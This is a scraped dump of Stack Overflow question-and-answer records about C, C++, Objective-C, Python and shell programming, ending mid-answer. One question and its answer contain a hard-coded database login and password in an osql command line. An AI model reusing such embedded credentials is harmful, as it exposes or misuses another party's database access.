<p>When I pass the following string ""http://www.google.ca"" I get random numbers (assuming address location?)</p>

<pre><code>#include ""stdafx.h""

#include &lt;string.h&gt;

#include &lt;string&gt;

#include &lt;stdlib.h&gt;

#include &lt;stdio.h&gt;

#include &lt;urlmon.h&gt;

#include &lt;tchar.h&gt;

#include &lt;fstream&gt;

using namespace std;

extern ""C"" __declspec(dllexport) LPCWSTR __cdecl GetPage(LPCWSTR URL);

BOOL APIENTRY DllMain( HANDLE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved ){
return TRUE;
}

LPCWSTR GetPage(LPCWSTR URL){

LPCWSTR status;

HRESULT getpage_status = URLDownloadToFile ( NULL,URL, _TEXT(""status.log""), 0, NULL );

/*** Do stuff is working if I pass a static string eg URL = ""http://www.google.ca""; I need command line args sent  to the function instead***/

return status;
</code></pre>
","9530","","<p>You cannot use rundll32 to run any DLL function, you can only use it to run functions that have the following signature:</p>

<pre><code>  void CALLBACK
  EntryPoint(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow);
</code></pre>

<p>See <a href=""http://support.microsoft.com/kb/q164787/"" rel=""nofollow"">MSDN</a> for more info.  Either change <code>GetPage</code> to use this function signature, or create a new function with that signature to use as an entry point and have that call <code>GetPage</code>.</p>
"
"<p>I was browsing through a <a href=""http://www.c-faq.com/aryptr/non0based.html"" rel=""nofollow"">webpage</a> which had some c FAQ's, I found this statement made. </p>

<blockquote>
  <p>Similarly, if a has 10 elements and ip
  points to a[3], <strong>you can't compute or
  access ip + 10 or ip - 5.</strong> (There is
  one special case: you can, in this
  case, compute, but not access, a
  pointer to the nonexistent element
  just beyond the end of the array,
  which in this case is &amp;a[10].</p>
</blockquote>

<p>I was confused by the statement </p>

<blockquote>
  <p>you can't compute ip + 10</p>
</blockquote>

<p>I can understand accessing the element out of bounds is undefined, but computing!!!. </p>

<p>I wrote the following snippet which <em>computes</em> (let me know if this is what the website meant by <em>computing</em>) a pointer out-of-bounds.</p>

<pre><code>#include &lt;stdio.h&gt;                                                                                                                                                                  

int main()                                                                                                                                                                          
{                                                                                                                                                                                   
        int a[10], i;                                                                                                                                                               
        int *p;                                                                                                                                                                     

        for (i = 0; i&lt;10; i++)                                                                                                                                                      
                a[i] = i;                                                                                                                                                           

        p = &amp;a[3];                                                                                                                                                                  

        printf(""p = %p and p+10 = %p\n"", p, p+10);                                                                                                                                  
        return 0;                                                                                                                                                                   
}                     

$ ./a.out                                                                                                                                     
p = 0xbfa53bbc and p+10 = 0xbfa53be4     
</code></pre>

<p>We can see that p + 10 is pointing to 10 elements(40 bytes) past p. So what exactly does the statement made in the webpage mean. Did I mis-interpret something.</p>

<p>Even in K&amp;R (A.7.7) this statement is made:</p>

<blockquote>
  <p>The result of the + operator is the
  sum of the operands. A pointer to an
  object in an array and a value of any
  integral type may be added. ... The
  sum is a pointer of the same type as
  the original pointer, and points to
  another object in the same array,
  appropriately offset from the original
  object. Thus if P is a pointer to an
  object in an array, the expression P+1
  is a pointer to the next object in the
  array. <em>If the sum pointer points
  outside the bounds of the array,
  except at the first location beyond
  the high end, the result is
  undefined.</em></p>
</blockquote>

<p>What does being ""undefined"" mean. Does this mean the sum will be undefined, or does it only mean when we dereference it the behavior is undefined. Is the operation undefined even when we do not dereference it and just calculate the pointer to element out-of-bounds. </p>
","9530","","<p>Undefined behavior means exactly that: <em>absolutely anything could happen</em>.  It could succeed silently, it could fail silently, it could crash your program, it could blue screen your OS, or it could erase your hard drive.  Some of these are not very likely, but all of them are permissible behaviors <em>as far as the C language standard is concerned</em>.  </p>

<p>In this particular case, yes, the C standard is saying that even <em>computing the address</em> of a pointer outside of valid array bounds, without dereferencing it, is undefined behavior.  The reason it says this is that there are some arcane systems where doing such a calculation could result could result in a fault of some sort.  For example, you might have an array at the very end of addressable memory, and constructing a pointer beyond that would cause an overflow in a special address register which generates a trap or fault.  The C standard wants to permit this behavior in order to be as portable as possible.</p>

<p>In reality, though, you'll find that constructing such an invalid address without dereferencing it has well-defined behavior on the vast majority of systems you'll come across in common usage.  Creating an invalid memory address will have no ill effects unless you attempt to dereference it.  But of course, it's better to avoid creating those invalid addresses so that your code will work perfectly even on those arcane systems.</p>
"
"<p>I am sending email with EmailMessage object to Gmail box.<br>
The subject of an email looks something like this:
u""You got a letter from Daėrius ęėįęėįęįėęįę---reply3_433441""</p>

<p>When i receive an email, looking at the message info i can see that Subject line looks like this:</p>

<p>Subject: =?utf-8?b?WW91IGdvdCBhIGxldHRlciBmcm9tIERhxJdyaXVzIMSZxJfEr8SZxJfEr8SZ?=
 =?utf-8?b?xK/El8SZxK/EmS0tLXJlcGx5M180MzM0NDE=?=</p>

<p>How to decode this subject line?  </p>

<p>I have sucesfully decoded email body (tex/plain) with this:</p>

<pre><code>for part in msg.walk():
  if part.get_content_type() == 'text/plain':
    msg_encoding = part.get_content_charset()
    msg_text = part.get_payload().decode('quoted-printable')
msg_text = smart_unicode(msg_text, encoding=msg_encoding, strings_only=False, errors='strict') 
</code></pre>
","9530","","<p>See <a href=""http://tools.ietf.org/html/rfc2047"" rel=""nofollow"">RFC 2047</a> for a complete description of the format of internationalized email headers.  The basic format is <code>""=?"" charset ""?"" encoding ""?"" encoded-text ""?=""</code>.  So in your case, you have a base-64 encoded UTF-8 string.</p>

<p>You can use the <a href=""http://docs.python.org/library/email.header.html#email.header.decode_header"" rel=""nofollow""><code>email.header.decode_header</code></a> and <a href=""http://docs.python.org/library/stdtypes.html#str.decode"" rel=""nofollow""><code>str.decode</code></a> functions to decode it and get a proper Unicode string:</p>

<pre><code>&gt;&gt;&gt; import email.header
&gt;&gt;&gt; x = email.header.decode_header('=?utf-8?b?WW91IGdvdCBhIGxldHRlciBmcm9tIERhxJdyaXVzIMSZxJfEr8SZxJfEr8SZ?=')
&gt;&gt;&gt; x
[('You got a letter from Da\xc4\x97rius \xc4\x99\xc4\x97\xc4\xaf\xc4\x99\xc4\x97\xc4\xaf\xc4\x99', 'utf-8')]
&gt;&gt;&gt; x[0][0].decode(x[0][1])
u'You got a letter from Da\u0117rius \u0119\u0117\u012f\u0119\u0117\u012f\u0119'
</code></pre>
"
"<p>ints only go to 32 bits, longs to 64bits... 
so.. what do you do when you are working with a much larger number?</p>

<p>Also, how easy would it be to switch between the binary representation and the hex representation?</p>
","9530","","<p>Use an array.  For example:</p>

<pre><code>// Declare a structure containing an array of 4 64-bit integers
struct uint256_t
{
    uint64_t bits[4];
};

// Then, to convert to hex:
uint256_t x;
char hexstring[65];  // needs to be at least 64 hex digits + 1 for the null terminator
sprintf(hexstring, ""%016llx%016llx%016llx%016llx"", x.bits[0], x.bits[1], x.bits[2], x.bits[3]);
</code></pre>
"
"<p>I'm writing a linux shell for a custom scripting language, and I want to print a ""... "" before each follow-up line a user enters for a single statement, with the first line having a "">>> "" printed, then waiting for input. Following is an example:</p>

<pre><code>&gt;&gt;&gt; void f() {
...  ""this is a test""
... }
&gt;&gt;&gt; 
</code></pre>

<p>I'm reading the line with <code>fgets</code>, and after I read it completely, I print the ""... "", and repeat using another call to <code>fgets</code>. This works fine for moderately fast interactive input. But if I paste code containing newlines into the terminal, what I get is the following</p>

<pre><code>&gt;&gt;&gt; void f() {
 ""this is a test""
}
... ... &gt;&gt;&gt; 
</code></pre>

<p>The ""... ""'es are printed too late, even though I emit a <code>fflush</code> call after I print them to <code>stdout</code>. Does anyone know whether there is anything special to do to make this work?</p>
","9530","","<p>There's not really a simple way to do it using stdio -- you'll need to use something like <a href=""http://www.gnu.org/software/ncurses/"" rel=""nofollow"">ncurses</a> to control the terminal.  The issue is that when you copy and paste multiple lines like that, they all get pulled into stdin's read buffer in a single call to <code>read(2)</code>, so stdout has no chance to intervene and print the intervening prompts.</p>
"
"<p>Is there a way of getting the dimensions of a png file in a specific path? I don´t need to load the file, I just need the width and height to load a texture in directx.</p>

<p>(And I don´t want to use any third-party-libs)</p>
","9530","","<p>No, you can't do it without reading part of the file.  Fortunately, the file headers are simple enough that you can read them without a library, if you don't need to read the actual image data.</p>

<p>If you know for sure that you have a valid PNG file, you can read the width and height from offsets 16 and 20 (4 bytes each, big-endian), but it may also be a good idea to verify that the first 8 bytes of the file are exactly ""89 50 4E 47 0D 0A 1A 0A"" (hex) and that bytes 12-15 are exactly ""49 48 44 52"" (""IHDR"" in ASCII).</p>
"
"<p>I have this C++ code.</p>

<pre><code>#include &lt;string&gt;
#define IC(E) virtual const E const = NULL; 

struct IDumpable
{
    IC(std::string ToDumpString());
};

class Hello : public IDumpable
{
public:
    const std::string ToDumpString() const {
        std::string a(""hello""); return a;
    }
};

int main()
{
    Hello hello;
    hello.ToDumpString();
}
</code></pre>

<p>It compiles/runs fine with MSVC, but I got <code>invalid pure specifier (only '= 0' is allowed) before ‘;’ token</code> error with g++.</p>

<p>What's wrong with it?</p>
","9530","","<p>What's wrong is exactly what the error message says: <strong>only <code>""= 0""</code></strong> is allowed in the pure virtual function specification, and you're saying instead <code>= NULL</code>.  The C++ standard defines <code>NULL</code> as ""an implementation-defined C++ null pointer constant"" (C++03 §18.1/4).  0 is one such null pointer constant, but <code>NULL</code> is not required to be 0.</p>

<p>It just so happens that MSVC defines <code>NULL</code> to 0, but GCC in fact defines <code>NULL</code> as <code>__null</code>.  GCC says that <code>__null</code> is a valid null pointer constant, but <code>__null</code> is not 0, so you cannot use it in the specification of a pure virtual function.</p>
"
"<p>I have a assignment operator.</p>

<pre><code>AP&lt;T&gt;&amp; operator=(AP&lt;T&gt;&amp; o) {Super::operator=(o); return *this; }
</code></pre>

<p>When I expect the g++ compiler finds this operator for this code.</p>

<pre><code>AP&lt;System&gt; to = System::Create();
</code></pre>

<p>I got compilation error. </p>

<pre><code>no matching function for call to ‘H::AP&lt;H::System&gt;::AP(H::AP&lt;H::System&gt;)’
ap.cpp:13: note: candidates are: H::AP&lt;T&gt;::AP(H::AP&lt;U&gt;&amp;) [with U = H::System, T = H::System]
ap.cpp:12: note:                 H::AP&lt;T&gt;::AP(H::AP&lt;T&gt;&amp;) [with T = H::System]
ap.cpp:11: note:                 H::AP&lt;T&gt;::AP(T*) [with T = H::System]
</code></pre>

<p>Why is this? MSVC compiles this code without problem. </p>

<p>The source is as follows.</p>

<pre><code>#include &lt;memory&gt;

namespace H {

template&lt;typename T&gt;
class AP : public std::auto_ptr&lt;T&gt;
{
    typedef std::auto_ptr&lt;T&gt; Super;
public:
    template&lt;typename U&gt; AP&lt;T&gt;&amp; operator=(AP&lt;U&gt;&amp; o) { Super::operator=(o.release()); return *this; }
    AP&lt;T&gt;&amp; operator=(AP&lt;T&gt;&amp; o) { Super::operator=(o); return *this; }
};

class System {
public:
    static AP&lt;System&gt; Create(); 
};

AP&lt;System&gt; System::Create()
{
    AP&lt;System&gt; a(new System()); 
    return a;
}

int main()
{
    AP&lt;System&gt; to = System::Create();
}
};
</code></pre>

<h2>ADDED</h2>

<p>With <code>AP(const AP&lt;T&gt;&amp; o) : Super(o) { }</code>, I got those errors.</p>

<pre><code>ap.cpp: In copy constructor ‘H::AP&lt;T&gt;::AP(const H::AP&lt;T&gt;&amp;) [with T = H::System]’:
ap.cpp:33:   instantiated from here
ap.cpp:12: error: passing ‘const H::AP&lt;H::System&gt;’ as ‘this’ argument of ‘std::auto_ptr&lt;_Tp&gt;::operator std::auto_ptr_ref&lt;_Tp1&gt;() [with _Tp1 = H::System, _Tp = H::System]’ discards qualifiers
</code></pre>

<h2>ADDED2</h2>

<p>I don't know it's the best solution, but this code seems to work.</p>

<pre><code>int main()
{
  H::AP&lt;H::System&gt; tox(H::System::Create().release());
  return 0;
}
</code></pre>
","9530","","<p>It's looking for a copy constructor, not an <code>operator=</code>: read the error message more carefully.  Your copy constructor is not defined correctly: you need to defined it as a <code>const</code> reference:</p>

<pre><code>AP(const AP&lt;T&gt;&amp; o) : Super(o) { }
// ^^^^^
</code></pre>
"
"<p>I am very new to Objective-C. I know C and C++ but Objective-C has quite the learning curve. Anyway, is there a shorter way (possibly by some kind of NSNumber literal if such exists) to write the following:</p>

<pre><code>[Tyler setArms:[[[NSNumber alloc] autorelease] initWithInt:1]];
</code></pre>
","9530","","<p>Yes, just use one of the many helper functions such as <a href=""http://developer.apple.com/library/mac/#documentation/Cocoa/Reference/Foundation/Classes/NSNumber_Class/Reference/Reference.html"" rel=""nofollow"" rel=""nofollow""><code>numberWithInt:</code></a>:</p>

<pre><code>[Tyler setArms:[NSNumber numberWithInt:1]];
</code></pre>

<p>The expression <code>[NSNumber numberWithInt:1]</code> is equivalent to <code>[[[NSNumber alloc] initWithInt:1] autorelease]</code>, which is equivalent to <code>[[[NSNumber alloc] autorelease] initWithInt:1]</code>.  The latter expression is extremely uncommon.</p>
"
"<p>Does anyone know how to go from an <a href=""http://en.wikipedia.org/wiki/ISO_8601"" rel=""nofollow"">ISO-8601</a>-formatted date/time string to a <code>time_t</code>?
I am using C++ and it needs to work on Windows and Mac.</p>

<p>I have written the code but I am sure there is a version that is more ""standard.""</p>

<p>I will get a date like <code>2011-03-21 20:25</code> and I have to tell if the time is in the past or the future.</p>
","9530","","<p>You can use <a href=""http://linux.die.net/man/3/strptime""><code>strptime</code></a> to convert from a string to a <code>struct tm</code>, and then you can use <a href=""http://linux.die.net/man/3/mktime""><code>mktime</code></a> to convert from a <code>struct tm</code> to a <code>time_t</code>.  For example:</p>

<pre><code>// Error checking omitted for expository purposes
const char *timestr = ""2011-03-21 20:25"";
struct tm t;
strptime(timstr, ""%Y-%m-%d %H:%M"", &amp;t);
time_t t2 = mktime(&amp;t);
// Now compare t2 with time(NULL) etc.
</code></pre>
"
"<p>In C++, I want my class to have a char** field that will be sized with user input. Basically, I want to do something like this - </p>

<pre><code>char** map;
map = new char[10][10];
</code></pre>

<p>with the 10's being any integer number. I get an error saying cannot convert char*[10] to char**. Why can it not do this when I could do - </p>

<pre><code>char* astring;
astring = new char[10];
</code></pre>

<p>?</p>
","9530","","<p>Because <strong>an array is not a pointer</strong>.  Arrays <em>decay</em> into pointers to their first elements, but that happens only at the first level: a 2D array decays into a pointer to a 1D array, but that's it—it does not decay into a pointer to a pointer.</p>

<p><code>operator new[]</code> allows to allocate a dynamic array of a size only known at runtime, but it only lets you allocate 1D arrays.  If you want to allocate a dynamic 2D array, you need to do it in two steps: first allocate an array of pointers, then for each pointer, allocate another 1D array.  For example:</p>

<pre><code>char **map = new char*[10];  // allocate dynamic array of 10 char*'s
for(int i = 0; i &lt; 10; i++)
    map[i] = new char[10];  // allocate dynamic array of 10 char's
</code></pre>

<p>Then to free the array, you have to deallocate everything in reverse:</p>

<pre><code>for(int i = 0; i &lt; 10; i++)
    delete [] map[i];
delete [] map;
</code></pre>
"
"<p>The following is an excerpt from a code sample in K&amp;R's The C Programming Language (section 8.7):</p>

<pre><code>typedef long Align;

union header {
    struct {
        union header *ptr;
        unsigned size;
    } s;
    Align x;
};

typedef union header Header;
</code></pre>

<p>And here is the explanatory excerpt:</p>

<blockquote>
  <p>To simplify alignment, all blocks are
  multiples of the header size, and the
  header is aligned properly. This is
  achieved by a union that contains the
  desired header structure and an
  instance of the most restrictive type,
  which we have arbitrarily made a long.</p>
</blockquote>

<p>So, as I understand it, the idea is to ensure that a <code>header</code> instance takes up a number of bytes that is a multiple of <code>sizeof(Align)</code>. The goal makes perfect sense to me.</p>

<p>But consider the case where <code>long</code> is 64 bits, <code>int</code> is 32 bits, and a pointer is 64 bits. In that case, <code>header.s</code> will be 64+32 = 96 bits. Thus, <code>sizeof(header)</code> will be 96 bits, which is not a multiple of 64 as intended.</p>

<p>In such a case, I suppose it would be necessary to define <code>Align</code> as something else (perhaps <code>double</code>). But I'm not quite sure whether I'm fully understanding what would dictate that choice for a particular architecture. Is it just the ""biggest"" type? And what if <code>long</code> is the biggest type - couldn't it fail to work in the way I described above?</p>

<p>Thanks</p>
","9530","","<p>The size of a union is at least as large as the size of its largest member.  So, even if <code>sizeof(s)</code> is 12 and <code>sizeof(long)</code> is 8, as in your example, you will still have <code>sizeof(header) &gt;= 12</code>.  Likewise, the alignment of a union is largest alignment of any of its members, so the presence of the <code>long</code> member ensures that the alignment of <code>header</code> is at least the alignment of <code>long</code>, which would be 8 in this case.</p>

<p>If you compile this code, you will almost certainly find that <code>sizeof(header)</code> is 16, not 12.  The reason is that if you have an array of <code>header</code> objects, the compiler needs to ensure that the alignment of any of the members is proper, and arrays are stored contiguously in memory.  In order to achieve that, the size needs to be a multiple of the alignment.  The compiler does that by adding an extra 4 bytes of padding to the end of a <code>header</code> object.</p>
"
"<p>We can pass reference of an array to a function like:</p>

<pre><code>void f(int (&amp;a)[5]);

int x[5];
f(x);     //okay
int y[6];
f(y);     //error - type of y is not `int (&amp;)[5]`.
</code></pre>

<p>Or even better, we can write a function template:</p>

<pre><code>template&lt;size_t N&gt;
void f(int (&amp;a)[N]); //N is size of the array!

int x[5];
f(x);     //okay - N becomes 5
int y[6];
f(y);     //okay - N becomes 6
</code></pre>

<hr>

<p>Now my question is, how to return reference of an array from a function?</p>

<p>I want to return array of folllowing types from a function:</p>

<pre><code>int a[N];
int a[M][N];
int (*a)[N];
int (*a)[M][N];
</code></pre>

<p>where <code>M</code> and <code>N</code> is known at compile time!</p>

<p>What are general rules for passing and returning compile-time reference of an array to and from a function? How can we pass reference of an array of type <code>int (*a)[M][N]</code> to a function?</p>

<p>EDIT:</p>

<p><strong>Adam</strong> commented : <code>int (*a)[N]</code> is not an array, it's a pointer to an array.</p>

<p>Yes. But one dimension is known at compile time! How can we pass this information which is known at compile time, to a function?</p>
","9530","","<p>As <a href=""http://stackoverflow.com/questions/5398930/general-rules-of-passing-returning-an-array-not-pointer-to-from-a-function/5398968#5398968"">Erik mentioned</a>, you can't return an array from a function.  You can return a pointer or a reference, although the syntax is quite hairy:</p>

<pre><code>// foo returns a pointer to an array 10 of int
int (*foo(float arg1, char arg2))[10] { ... }

// bar returns a reference to an array 10 of int
int (&amp;foo(float arg1, char arg2))[10] { ... }
</code></pre>

<p>I'd strongly recommend making a typedef for the array type:</p>

<pre><code>// IntArray10 is an alias for ""array 10 of int""
typedef int IntArray10[10];

// Equivalent to the preceding definitions
IntArray10 *foo(float arg1, char arg2) { ... }
IntArray10 &amp;bar(float arg1, char arg2) { ... }
</code></pre>
"
"<p>I have defined c as</p>

<pre><code>char c[][10]
</code></pre>

<p>in function definition and used it like <code>c[i]=""gray"";</code></p>

<p>Whats wrong? I searched on net, it shows the same syntax.</p>

<p>Thanks.</p>
","9530","","<p>The problem is that arrays are not assignable in C.  String constants like <code>""gray""</code> are character array constants: in this case, the type is <code>char[5]</code> (4 + 1 for the terminating null).</p>

<p>If you know that the destination array is large enough to hold the desired string, you can use <a href=""http://linux.die.net/man/3/strcpy"" rel=""nofollow""><code>strcpy</code></a> to copy the string like so:</p>

<pre><code>// Make sure you know that c[i] is big enough!
strcpy(c[i], ""gray"");
</code></pre>

<p>A better idea is to use a safer function such as <a href=""http://www.openbsd.org/cgi-bin/man.cgi?query=strlcpy&amp;sektion=3"" rel=""nofollow""><code>strlcpy</code></a> (BSD-based systems and Mac OS X) or <a href=""http://msdn.microsoft.com/en-us/library/td1esda9%28v=vs.80%29.aspx"" rel=""nofollow""><code>strcpy_s</code></a> (Windows):</p>

<pre><code>strlcpy(c[i], ""gray"", 10);  // 10 is the size of c[i]
</code></pre>

<p>However, these functions are platform-specific and not all that portable.  You could also roll your own implementation if speed is not an issue:</p>

<pre><code>size_t strlcpy(char *dst, const char *src, size_t size)
{
    size_t len = 0;
    while(size &gt; 1 &amp;&amp; *src)
    {
        *dst++ = *src++;
        size--;
        len++;
    }
    if(size &gt; 0)
        *dst = 0;
    return len + strlen(src);    
}
</code></pre>

<p>Do <strong>not</strong> use <code>strncpy</code>, since <a href=""http://stackoverflow.com/questions/1453876/why-does-strncpy-not-null-terminate"">it could potentially leave you with a non-null-terminated string</a></p>
"
"<p>Can you think of 'a program' which gives 'different outputs for a C and a C++ compilers' (yet gives consistent output under the same language)?</p>
","9530","","<p><a href=""http://david.tribble.com/text/cdiffs.htm"">Incompatibilities between ISO C and ISO C++</a></p>

<p>A common example is <code>sizeof('A')</code>, which is usually 4 in C but always 1 in C++, because character constants like <code>'A'</code> have the type <code>int</code> in C but the type <code>char</code> in C++:</p>

<pre><code>#include &lt;stdio.h&gt;

int main(void)
{
    printf(""%d\n"", sizeof('A'));
}
</code></pre>
"
"<p>Can some help me  i have create this command</p>

<hr>

<pre><code>fout &lt;&lt;""osql -Ubatascan -Pdtsbsd12345 -dpos -i""""c:\\temp_pd.sql""""""&lt;&lt;endl;
</code></pre>

<p>Result Output</p>

<pre><code>osql -Ubatascan -Pdtsbsd12345 -dpos -ic:\temp_pd.sql
</code></pre>

<hr>

<p>Output that i want </p>

<pre><code>osql -Ubatascan -Pdtsbsd12345 -dpos -i""c:\temp_pd.sql""
</code></pre>

<p>can some one help?</p>
","9530","","<p>What you're doing is actually writing multiple string literals next to each other.  The expression</p>

<pre><code>""foo""""bar""
</code></pre>

<p>gets parsed as the two string literals <code>""foo""</code> and <code>""bar""</code>.  The C and C++ languages say that when you have string literals next to each other, they get pasted together into one big string literal at compile time.  So, the above expression is entirely equivalent to the single string literal <code>""foobar""</code>.</p>

<p>Hence, your expression gets parsed as the following three string literals:</p>

<pre><code>""osql -Udatascan -Pdtsbsd7188228 -dpos -i""
""c:\\temp_pd.sql""
""""
</code></pre>

<p>Which when pasted together form the string <code>""osql -Udatascan -Pdtsbsd7188228 -dpos -ic:\\temp_pd.sql"" (note that the third string is the empty string</code>""""`).</p>

<p>What you want to do is to use the escape sequence <code>\""</code> to include a literal quotation mark within your string literal.  Write it like this:</p>

<pre><code>""osql -Udatascan -Pdtsbsd7188228 -dpos -i\""c:\\temp_pd.sql\""""
</code></pre>

<p>Normally, the quotation mark <code>""</code> gets interpreted as the end of a string literal, except when it's preceded by a backslash, in which case it gets interpreted as a quotation mark character within the string.</p>
"
"<p>I'm currently working on a cross-platform task scheduler, but I'm having a problem with sem_wait spinning while waiting for the semaphore. On Windows, I'm using WaitForSingleObject, which yields the thread while it waits, which is what I want. But sem_wait causes the threads to just spin, which is inefficient and unnecessary. Is there any way to make sem_wait yield the thread instead of just spinning?</p>

<p>Thanks</p>
","9530","","<p>You could try using <a href=""https://computing.llnl.gov/tutorials/pthreads/#ConditionVariables"" rel=""nofollow"">condition variables</a> instead of semaphores.  They're not completely identical in function, but depending on your usage, you might be able to use instead.  They function similarly to Windows events, in that you wait on a condition variable to wait for something to happen, and you signal a condition variable to indicate that something happened.</p>

<p><code>pthread_cond_wait</code> is analogous to <code>WaitForSingleObject</code>, and <code>pthread_cond_signal</code> is analogous to <code>SetEvent</code>.</p>
"
"<p>I'm new to Obj-C and I have a question concerning the autorelease. Is it ok to return an autoreleased variable for several methods? For example:</p>

<pre><code>- (void) methodC {
    Object anObj = [self methodB];
    //Do something with anObj
}

- (Object *) methodB {
    return [self methodA];
}   

- (Object *) methodA {
    Object anObj = [[anObj alloc] init];
    release [anObj autorelease];  
}
</code></pre>

<p>Will the variable remain valid even if it is returned up a method chain and used at the top? Or does it have to be retained somewhere along the way?</p>

<p>thank you</p>
","9530","","<p>Yes, it will be valid in this case.  You only have to worry about the variable being deallocated if somebody drains the autorelease pool.  As long as you've written every function that returns along the way and you don't explicitly drain the autorelease pool, you don't have to worry about objects being deallocated from under you.</p>

<p>In the vast majority of cases, the code in the <code>NSRunLoop</code> takes care of draining the autorelease pool.  When you return control from your application code to the API code (such as by returning from a <code>touchesBegan</code> handler etc.), you don't know if the autorelease pool will be drained, so you have to assume in the worst case that it will.  In that case, you have to <code>retain</code> any objects you want to keep references to.</p>

<p>For example:</p>

<pre><code>NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];

Object *anObj = [self methodC];  // Your methodC as before -- anObj is valid

[pool drain];  // anObj will be deallocated here
</code></pre>
"
"<p>i just learnt that ifstat display network usage, and below command gives what i want on the console screen</p>

<pre><code>/usr/bin/ifstat -i eth0 -b -n | awk 'NR&gt;2 {print ""Download"" $1 ""upload"" $2}'
</code></pre>

<p>i want to output that into a file so that i can use javascript library to plot those values..</p>

<p>but i cannot seem to output the logs into a file</p>

<pre><code>/usr/bin/ifstat -i eth0 -b -n | awk 'NR&gt;2 {print ""Download"" $1 ""upload"" $2}' &gt; bandwidth.txt
</code></pre>

<p>bandwidth.txt is empty</p>

<p>can someone advise how to log network bandwidth usage into a file (collectl seems to be interesting but cannot figure out to get the uplaod and download stats)</p>
","9530","","<p>awk is buffering its output.  Normally, most programs use line buffering when stdout is a terminal but switch to larger buffer sizes when stdout is not a terminal, and awk is no exception.  If you ran your command for long enough, you'd eventually see the file size grow in chunks of size 4096 or so (possibly more or less) as the buffer fills up and gets flushed.</p>

<p>To force awk to flush its buffer after every line regardless of whether or not stdout is a terminal, add an <code>fflush()</code> command:</p>

<pre><code>/usr/bin/ifstat -i eth0 -b -n | awk 'NR&gt;2 {print ""Download"" $1 ""upload"" $2; fflush()}' &gt; bandwidth.txt
</code></pre>
"
"<p>I have included three20 library in my project. I am making use of the TTThumbsViewController. Everything was working great until i upgraded to Xcode 3.2.6 and iOS 4.3. The grid of photos appears fine, but as soon as i click on one the thumbs, the app crashes. I am certain that this is not a memory issue. It works fine on the simulator though. Here is the crash report : </p>

<blockquote>
  <p>Incident Identifier: 3C63956F-F718-468F-B113-116E457DEB4E<br>
  CrashReporter Key:   32180af33b999869f98369f8d85412b799a88fdb<br>
  Hardware Model:      iPhone3,1<br>
  Process:         MyApp [15071]<br>
  Path:            /var/mobile/Applications/13C32157-F4CA-44BC-BB8F-D9A9FE9EAE38/MyApp.app/MyApp<br>
  Identifier:      MyApp<br>
  Version:         ??? (???)<br>
  Code Type:       ARM (Native)<br>
  Parent Process:  launchd [1]  </p>
  
  <p>Date/Time:       2011-05-06 21:48:06.042 -0500<br>
  OS Version:      iPhone OS 4.3 (8F190)<br>
  Report Version:  104  </p>
  
  <p>Exception Type:  EXC_CRASH (SIGABRT)<br>
  Exception Codes: 0x00000000, 0x00000000<br>
  Crashed Thread:  0  </p>
  
  <p>Thread 0 name:  Dispatch queue: com.apple.main-thread<br>
  Thread 0 Crashed:<br>
  0   libsystem_kernel.dylib    0x00011a1c __pthread_kill + 8<br>
  1   libsystem_c.dylib               0x000333b4 pthread_kill + 52<br>
  2   libsystem_c.dylib               0x0002bbf8 abort + 72<br>
  3   libstdc++.6.dylib               0x00044a64 __gnu_cxx::__verbose_terminate_handler() + 376<br>
  4   libobjc.A.dylib                 0x0000606c _objc_terminate + 104<br>
  5   libstdc++.6.dylib               0x00042e36 _<em>cxxabiv1::</em>_terminate(void (*)()) + 46<br>
  6   libstdc++.6.dylib               0x00042e8a std::terminate() + 10<br>
  7   libstdc++.6.dylib               0x00042f5a __cxa_throw + 78<br>
  8   libobjc.A.dylib                 0x00004c84 objc_exception_throw + 64<br>
  9   CoreFoundation                  0x0009e48a +[NSException raise:format:arguments:] + 62<br>
  10  CoreFoundation                  0x0009e4c4 +[NSException raise:format:] + 28<br>
  11  QuartzCore                      0x00001616 CALayerSetPosition(CALayer*, CA::Vec2 const&amp;, bool) + 134<br>
  12  QuartzCore                      0x00001584 -[CALayer setPosition:] + 32<br>
  13  QuartzCore                      0x000014d0 -[CALayer setFrame:] + 384<br>
  14  UIKit                           0x0000544e -[UIView(Geometry) setFrame:] + 182<br>
  15  MyApp                           0x00078366 -[TTPhotoView layoutSubviews] (TTPhotoView.m:221)<br>
  16  UIKit                           0x000055f4 -[UIView(CALayerDelegate)
  layoutSublayersOfLayer:] + 20<br>
  17  CoreFoundation                  0x0000befc -[NSObject(NSObject) performSelector:withObject:] + 16<br>
  18  QuartzCore    0x00002bae -[CALayer layoutSublayers] + 114  </p>
</blockquote>

<p>Any ideas anyone ?  </p>

<p>Thanks</p>
","9530","","<p>The function <code>CALayerSetPosition</code> is throwing an exception of type <code>NSException</code>, and nobody is catching it, so your application is getting terminated.  Try adding this code around the call to <code>-[UIView(Geometry) setFrame:]</code> inside the function <code>-[TTPhotoView layoutSubviews]</code> (which should be on line 221 of TTPhotoView.m):</p>

<pre><code>@try
{
    [myUIView setFrame:someFrame];
}
@catch(NSException *exception)
{
    NSLog(@""Caught exception: %@"", exception);
}
</code></pre>

<p>That should give you more information about why the exception is being thrown; most likely, you're passing an invalid parameter or something.</p>
"
"<p>This may be a stupid question. </p>

<p>I have a script that I want to be portable between Mac OS X and a Linux box I use. In OS X, a command in the script requires <code>sudo</code>, where on the Linux box, it does not. </p>

<p>Long story short, how does one run one command in a script with <code>sudo</code>, while then removing the elevated privileges for the rest of the script?</p>

<p>I have tried to use </p>

<pre><code>su -
</code></pre>

<p>and </p>

<pre><code>su -c
</code></pre>

<p>but they both seem to error out. (They say ""sorry"" and move on, I assume because it is trying to run as <code>root</code> and <code>root</code> does not have a password). </p>

<p>I know there has to be a silly and easy way to do this, what does everyone suggest?</p>
","9530","","<p>Try <code>sudo su</code> instead of <code>su</code> to change back to a regular user.</p>
"
"<p>Is it possible to access another instance's variables, given that we're working in the same class?</p>

<p>Or, in other words, can you do this Java code (which works in Java, I've done it before) in Objective C:</p>

<pre><code>class Matrix {
    private int mat[] = new int[16]; //wouldn't be a pointer in C

    public Matrix (Matrix m){
        for (int i = 0; i &lt; 16; i++){
            this.mat[i] = m.mat[i]; //&lt;-- this here
        }
    }
}
</code></pre>

<p>Given that arrays cannot be properties in Objective C, I can't make <code>mat[]</code> into a property. Is there any way to do this then?</p>
","9530","","<p>You can do it perfectly fine, you just can't make the instance variable (ivar) into a property:</p>

<pre><code>@interface Matrix : NSObject
{
@private
    int mat[16];
}
- (id) initWithMatrix:(Matrix *)m;
@end

@implementation Matrix
- (id) initWithMatrix:(Matrix *)m
{
